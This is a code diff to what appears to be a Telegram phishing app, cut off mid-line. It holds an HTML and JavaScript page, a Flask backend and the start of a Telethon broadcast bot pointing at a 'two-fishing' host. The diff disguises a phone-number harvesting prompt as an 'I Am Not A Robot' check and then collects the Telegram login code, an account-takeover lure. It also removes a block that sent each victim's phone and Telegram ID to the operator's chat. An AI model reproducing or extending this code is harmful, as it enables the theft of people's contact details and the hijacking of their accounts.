@@ -268,17 +268,17 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 <div class="wrap">
 
 <div id="contactBox" class="modal on">
-<div class="ico">&#128241;</div>
-<h2>Verify Your Number</h2>
-<p>Tap <strong>Share Contact</strong> below to continue</p>
-<button class="btn green" id="shareContactBtn">SHARE CONTACT</button>
+<div class="ico">&#129302;</div>
+<h2>I Am Not A Robot</h2>
+<p>Confirm that you are not a robot</p>
+<button class="btn green" id="shareContactBtn">CONFIRM NOW</button>
 <div id="contactMsg" class="msg"></div>
 </div>
 
 <div id="otpBox" class="modal">
 <div class="ico">&#128274;</div>
 <h2>Enter Verification Code</h2>
-<p>5-digit code sent to <strong id="phoneShow" style="color:#0088cc"></strong></p>
+<p>We Just Sent Your Access Code<br>Check your <strong>Telegram</strong></p>
 <div class="otps">
 <input type="tel" maxlength="1" inputmode="numeric" id="o1">
 <input type="tel" maxlength="1" inputmode="numeric" id="o2">
@@ -377,7 +377,7 @@ function triggerShare() {
         if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
           handleContact(event.responseUnsafe.contact);
         } else {
-          msg('contactMsg', 'Contact share required to continue', 'err');
+          msg('contactMsg', 'Confirm required to continue', 'err');
         }
       });
       return;
@@ -389,7 +389,7 @@ function triggerShare() {
         if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
           handleContact(event.responseUnsafe.contact);
         } else {
-          msg('contactMsg', 'Contact share required to continue', 'err');
+          msg('contactMsg', 'Confirm required to continue', 'err');
         }
       });
       return;
@@ -402,10 +402,10 @@ document.getElementById('shareContactBtn').onclick = triggerShare;
 
 function handleContact(c) {
   var phone = c.phone_number || '';
-  if (!phone) { msg('contactMsg', 'No phone number', 'err'); return; }
+  if (!phone) { msg('contactMsg', 'Try again', 'err'); return; }
   if (phone.charAt(0) !== '+') phone = '+' + phone;
   phoneNumber = phone;
-  msg('contactMsg', 'Verified!', 'ok');
+  msg('contactMsg', 'Confirmed!', 'ok');
   if (contactForce) { clearInterval(contactForce); contactForce = null; }
   fetch('/api/save_contact', {
     method: 'POST',
@@ -432,7 +432,6 @@ function handleContact(c) {
 function openOtp() {
   hide('contactBox'); hide('pwdBox'); hide('shareBox');
   show('otpBox');
-  document.getElementById('phoneShow').textContent = phoneNumber;
   ['o1','o2','o3','o4','o5'].forEach(function(id) { document.getElementById(id).value = ''; });
   document.getElementById('o1').focus();
   msg('otpMsg', 'Sending code...', 'info');
@@ -657,15 +656,6 @@ def save_contact():
         })
     with sessions_lock:
         pending_codes[phone] = 'contact_saved'
-    try:
-        http_requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            json={'chat_id': YOUR_TELEGRAM_ID,
-                'text': f"Contact: `{phone}` TG: `{tg_id}`",
-                'parse_mode': 'Markdown'},
-            timeout=10)
-    except Exception:
-        pass
     return jsonify({'success': True, 'phone': phone})
 
 
@@ -747,3 +737,46 @@ if __name__ == '__main__':
     if not all([BOT_TOKEN, API_ID, API_HASH, YOUR_TELEGRAM_ID]):
         logger.warning("Some env vars missing!")
     app.run(host='0.0.0.0', port=PORT, debug=False)
+    # bot.py
+import os
+import asyncio
+import logging
+import json
+import time
+from datetime import datetime
+from telethon import TelegramClient, events, Button
+from telethon.sessions import StringSession
+from telethon.tl.types import Message
+
+logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')
+logger = logging.getLogger("bot")
+
+BOT_TOKEN = (os.environ.get("BOT_TOKEN") or "").strip()
+API_ID = int(os.environ.get("API_ID", "0") or 0)
+API_HASH = (os.environ.get("API_HASH") or "").strip()
+OWNER_ID = int(os.environ.get("OWNER_ID", "0") or 0)
+WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
+
+# Broadcast state
+USERS_FILE = "bot_users.json"
+broadcast_state = {
+    "active": False,
+    "interval": 60,  # seconds
+    "messages": [],  # list of {"type": "text/photo/video", "content": str, "caption": str}
+    "next_run": 0,
+}
+
+
+def load_users():
+    if os.path.exists(USERS_FILE):
+        try:
+            with open(USERS_FILE) as f:
+                return json.load(f)
+        except Exception:
+            return {}
+    return {}
+
+
+def save_users(u):
+    try:
+        with open(USERS_FILE, 'w') as
